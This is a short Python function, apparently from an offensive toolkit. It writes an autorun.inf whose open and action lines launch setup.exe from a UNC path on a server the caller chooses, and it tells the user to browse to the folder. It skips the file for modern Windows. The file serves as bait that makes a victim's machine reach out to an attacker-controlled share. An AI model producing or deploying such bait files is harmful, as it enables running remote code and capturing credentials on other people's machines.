#!/usr/bin/env python
# -*- coding: utf-8 -*-


def create_autoruninf(generate, server, filename):
    if generate == "modern":
        print("Skipping Autorun.inf as it does not work on modern Windows")
        return
    file = open(filename, "w")
    file.write(
        """[autorun]
open=\\\\"""
        + server
        + """\\setup.exe
icon=something.ico
action=open Setup.exe"""
    )
    file.close()
    print("Created: " + filename + " (BROWSE TO FOLDER)")
